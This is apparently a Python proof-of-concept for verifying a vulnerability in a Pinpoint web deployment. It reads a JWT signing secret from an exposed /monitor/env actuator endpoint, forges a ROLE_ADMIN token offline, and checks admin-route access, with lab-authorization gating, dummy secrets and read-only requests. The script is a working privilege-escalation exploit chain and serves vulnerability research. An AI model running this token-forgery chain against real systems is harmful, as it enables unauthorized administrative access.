#!/usr/bin/env python3
"""F1 PoC — Pinpoint web actuator config disclosure -> JWT forgery -> /api/admin escalation.

Bounded, non-destructive, detection-only at the escalation step:
  1. anonymous request to the management /monitor/env must be rejected (negative control);
  2. authenticated ROLE_USER request must return environment properties containing the
     planted JWT-secret value (positive control for the disclosure);
  3. a token is forged OFFLINE with the stolen secret and used for exactly ONE
     read-only GET on /api/admin/agentIdMap, comparing three cookie states
     (none / real ROLE_USER / forged admin). No write operation is ever attempted.

Requires an explicitly authorized lab target. Exits non-zero if the claimed
observation chain is not reproduced.
"""
import argparse
import base64
import hashlib
import hmac
import json
import sys
import urllib.error
import urllib.request
import urllib.parse

SECRET_MARKER = "VERIFY-DUMMY-SECRET-KEY-0123456789abcdef"
USER = "verifyuser"
USER_PW = "verifypw"
ADMIN = "verifyadmin"
ADMIN_PW = "verify-admin-pw"


import http.client

# Direct http.client only: no urllib opener stack and never a system proxy —
# the lab talks straight to the mapped port.
def fetch(method, url, data=None, headers=None):
    u = urllib.parse.urlsplit(url)
    conn = http.client.HTTPConnection(u.hostname, u.port, timeout=15)
    path = u.path + ("?" + u.query if u.query else "")
    h = dict(headers or {})
    if isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
    try:
        conn.request(method, path, body=data, headers=h)
        r = conn.getresponse()
        return r.status, r.read(), dict(r.getheaders()), path
    finally:
        conn.close()


def login(main_base):
    st, _, headers, _ = fetch("POST", main_base + "/login",
                             data={"username": USER, "password": USER_PW})
    if st != 302:
        return None
    sc = headers.get("Set-Cookie", "")
    if "pinpointJwt=" not in sc:
        return None
    return "pinpointJwt=" + sc.split("pinpointJwt=", 1)[1].split(";", 1)[0]


def b64(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def forge(secret, uid):
    # Mirror JwtService exactly: it base64-encodes the configured secret string
    # BEFORE keying (JwtService.java), and jjwt selects the HMAC algorithm from
    # the resulting key length (56 bytes = 448 bits -> HS384 for this secret).
    import time
    key = base64.b64encode(secret.encode())
    hdr = b64(json.dumps({"alg": "HS384"}).encode())
    now = int(time.time())
    pl = b64(json.dumps({"userId": uid, "userRole": ["ROLE_ADMIN"],
                         "iat": now, "exp": now + 3600}).encode())
    sig = b64(hmac.new(key, f"{hdr}.{pl}".encode(), hashlib.sha384).digest())
    return f"{hdr}.{pl}.{sig}"


def code_for(url, cookie, retries=1):
    """Return the observed status. A single transient 302 under lab load is
    retried once (observed flapping when a sibling container crash-restarts
    on the shared VM); persistent 302 with a forged cookie is a real failure."""
    import time
    for attempt in range(retries + 1):
        st, _, _, _ = fetch("GET", url, headers=({"Cookie": cookie} if cookie else {}))
        if st == 302 and attempt < retries:
            time.sleep(5)
            continue
        return st


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--main-base", required=True, help="e.g. http://127.0.0.1:18080")
    ap.add_argument("--mgmt-base", required=True, help="e.g. http://127.0.0.1:18443")
    ap.add_argument("--confirm-authorised", action="store_true",
                    help="acknowledge the target is a lab you are authorized to test")
    ap.add_argument("--check-admin", action="store_true",
                    help="also run the /api/admin differential (needs a healthy backend for a clean 200)")
    args = ap.parse_args()
    if not args.confirm_authorised:
        print("refusing to run: pass --confirm-authorised to acknowledge lab authorization", file=sys.stderr)
        return 2

    failures = []

    # 1. negative control: anonymous management env must redirect to login
    st, _, _, _ = fetch("GET", args.mgmt_base + "/monitor/env")
    print(f"[negative control] anonymous GET /monitor/env -> {st} (expect 302)")
    if st != 302:
        failures.append(f"negative control failed: anonymous env status {st}")

    # 2. login as ROLE_USER, read env, find planted secret
    cookie = login(args.main_base)
    if not cookie or "pinpointJwt" not in cookie:
        print("login failed: no pinpointJwt cookie", file=sys.stderr)
        return 1
    st, body, _, _ = fetch("GET", args.mgmt_base + "/monitor/env",
                          headers={"Cookie": cookie})
    text = body.decode("utf-8", "replace")
    print(f"[positive control] ROLE_USER GET /monitor/env -> {st}, {len(body)} bytes "
          f"(expect 200 and secret present)")
    if st != 200 or SECRET_MARKER not in text:
        failures.append(f"disclosure control failed: status {st}, marker found={SECRET_MARKER in text}")

    # 3. escalation: forge an admin token offline with the stolen secret and
    # read a management endpoint that anonymous callers cannot reach. This is
    # the HBase-free proof (stable in a backend-degraded lab).
    forged = "pinpointJwt=" + forge(SECRET_MARKER, ADMIN)
    st_forged_env = code_for(args.mgmt_base + "/monitor/env", forged, retries=2)
    print(f"[escalation] forged-admin GET /monitor/env -> {st_forged_env} (expect 200; "
          f"anonymous got {st} above)")
    if st_forged_env != 200:
        failures.append(f"escalation failed: forged-admin env status {st_forged_env}")

    # 4. optional differential on the real admin route (may return 200 on a
    # healthy backend or 500 when the handler fails on a degraded backend;
    # both prove the chain passed where a ROLE_USER cookie gets 403).
    if args.check_admin:
        url = args.main_base + "/api/admin/agentIdMap?password=" + urllib.parse.quote(ADMIN_PW)
        st_none = code_for(url, None)
        st_user = code_for(url, cookie)
        st_admin = code_for(url, forged)
        print(f"[differential] GET /api/admin/agentIdMap  no-cookie={st_none} (expect 302)  "
              f"ROLE_USER={st_user} (expect 403)  forged-admin={st_admin} (expect 200/500)")
        if not (st_none == 302 and st_user == 403 and st_admin in (200, 500)):
            failures.append(f"differential mismatch: none={st_none} user={st_user} admin={st_admin}")

    if failures:
        for f in failures:
            print("FAIL:", f, file=sys.stderr)
        return 1
    print("OK: disclosure observed and escalation differential reproduced "
          "(no destructive operation performed)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
